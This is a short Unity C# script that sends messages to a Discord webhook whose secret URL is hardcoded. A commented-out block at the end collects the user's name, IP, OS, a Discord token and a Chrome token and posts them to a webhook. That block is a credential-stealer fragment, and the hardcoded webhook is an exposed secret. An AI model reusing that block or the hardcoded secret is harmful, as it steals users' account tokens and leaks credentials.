using System.Xml.Serialization;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System.IO;
using System.Net;
using System.Text;
// using System.Management;


public class DcSend : MonoBehaviour
{

    DcWebHook dcWeb = new DcWebHook();
    void Awake()
    {
        dcWeb.ProfilePicture = "https://www.logolynx.com/images/logolynx/1b/1bcc0f0aefe71b2c8ce66ffe8645d365.png";
        dcWeb.UserName = "Webhook";
        dcWeb.WebHook = "https://discord.com/api/webhooks/942747547800305724/ctHcf1DSlEbkzuU61bpP1pAvHEAa_tNycmr9vruwhCOzuHvdfIJB8AsiNKWbH5M9X1X-";
    }
    public void Send(string s)
    { 
        dcWeb.SendMessage(s);
        
    }
                



    // using (DcWebHook dcWeb = new DcWebHook())
    //         {
    //             ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
    //             foreach (ManagementObject managementObject in mos.Get())
    //             {
    //                 String OSName = managementObject["Caption"].ToString();
    //                 dcWeb.ProfilePicture = "https://www.logolynx.com/images/logolynx/1b/1bcc0f0aefe71b2c8ce66ffe8645d365.png";
    //                 dcWeb.UserName = "Webhook";
    //                 dcWeb.WebHook = "YOURDISCORDWEBHOOK LINK"; 
    //                 dcWeb.SendMessage("```" + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS: " + OSName + Environment.NewLine + "Token DiscordAPP: " + string2 + Environment.NewLine + "Token Chrome: " + string4 + "```");
    //             }
    //         }
}
